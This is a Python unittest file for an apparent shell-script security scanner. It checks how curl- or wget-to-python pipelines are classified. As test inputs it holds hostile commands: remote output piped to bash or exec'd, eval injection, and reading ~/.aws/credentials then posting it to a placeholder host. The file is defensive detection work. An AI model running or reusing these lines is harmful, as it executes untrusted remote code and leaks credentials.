"""Source-only fixed consumer versus producer variables and independent raw risk."""
import unittest
from test_qindun_certify import MODULE


class ShellPipelineProducerTests(unittest.TestCase):
    def test_pipeline_contracts(self):
        cases = [
            ("literal_control", "curl https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("url_variable", "curl \"$URL\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("header_variable", "curl -H \"Authorization: Bearer ${TOKEN}\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("both_variables", "curl -H \"Authorization: Bearer ${TOKEN}\" \"${URL}\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("producer_body", "curl -d \"$PAYLOAD\" \"$URL\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("wget_variable", "wget -qO- \"$URL\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["candidate"]),
            ("multiline_reader", "curl \"$URL\" | python3 -c \"\nimport json\nimport sys\nprint(json.load(sys.stdin))\n\"", ["candidate"]),
            ("continued_producer", "curl -s \\\n  \"$URL\" | python3 -c \"\nimport json,sys\nprint(json.load(sys.stdin))\n\"", ["candidate"]),
            ("dynamic_program", "curl \"$URL\" | python3 -c \"$PROGRAM\"", ["confirmed"]),
            ("interpolated_reader", "curl \"$URL\" | python3 -c \"import json,sys; marker='$INPUT'; print(json.load(sys.stdin))\"", ["confirmed"]),
            ("date_interpolated_json_reader", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\ncurl "$URL" | python3 -c "import json,sys; data=json.load(sys.stdin); print(json.dumps({\'timestamp\':\'$TS\',\'data\':data.get(\'items\', [])}))"', ["candidate"]),
            ("unix_date_interpolated_json_reader", 'TS=$(date -u +%s)\ncurl "$URL" | python3 -c "import json,sys; print(json.dumps({\'timestamp\':\'$TS\',\'data\':json.load(sys.stdin)}))"', ["candidate"]),
            ("intermediate_stdin_json_reader", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\ncurl "$URL" | python3 -c "import json,sys; timestamp=\'$TS\'; raw=sys.stdin.read().strip(); data=json.loads(raw); print(json.dumps({\'timestamp\':timestamp,\'data\':data}))"', ["candidate"]),
            ("overwritten_date_interpolation", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\nTS="$INPUT"\ncurl "$URL" | python3 -c "import json,sys; print(json.dumps({\'timestamp\':\'$TS\',\'data\':json.load(sys.stdin)}))"', ["confirmed"]),
            ("read_overwrites_date_interpolation", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\nread TS\ncurl "$URL" | python3 -c "import json,sys; print(json.dumps({\'timestamp\':\'$TS\',\'data\':json.load(sys.stdin)}))"', ["confirmed"]),
            ("date_interpolation_in_fstring", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\ncurl "$URL" | python3 -c "import json,sys; data=json.load(sys.stdin); print(f\'{${TS}}\')"', ["confirmed"]),
            ("module_alias_mutation", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\ncurl "$URL" | python3 -c "import json,sys; module=json; module.__dict__[\'loads\']=eval; print(json.load(sys.stdin))"', ["confirmed"]),
            ("date_interpolated_exec", 'TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)\ncurl "$URL" | python3 -c "import json,sys; data=json.load(sys.stdin); exec(\'$TS\')"', ["confirmed"]),
            ("response_exec", "curl \"$URL\" | python3 -c 'import sys; exec(sys.stdin.read())'", ["confirmed"]),
            ("substitution_producer", "curl \"$(resolve_url)\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["confirmed"]),
            ("backtick_producer", "curl \"`resolve_url`\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'", ["confirmed"]),
            ("extra_consumer", "curl \"$URL\" | python3 -c 'import json,sys; print(json.load(sys.stdin))' | bash", ["confirmed"]),
            ("mixed_file", "curl \"$URL\" | python3 -c 'import json,sys; print(json.load(sys.stdin))'\ncurl https://other.invalid | bash", ["candidate","confirmed"]),
        ]
        for name, source, expected in cases:
            with self.subTest(name=name):
                hits = MODULE._shell_flow_findings("main.sh", source)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.REMOTE_PIPE_SHELL"}), expected
                )

    def test_credential_body_remains_confirmed(self):
        source = (
            "credential=$(cat ~/.aws/credentials)\n"
            'curl --data "$credential" https://example.invalid | '
            "python3 -c 'import json,sys; print(json.load(sys.stdin))'\n"
        )
        hits = MODULE._shell_flow_findings("main.sh", source)
        self.assertIn(
            ("QINDUN.D3.CREDENTIAL_EXFILTRATION", "confirmed"),
            {(h.rule_id, h.disposition) for h in hits},
        )
        self.assertIn(
            ("QINDUN.D3.REMOTE_PIPE_SHELL", "candidate"),
            {(h.rule_id, h.disposition) for h in hits},
        )
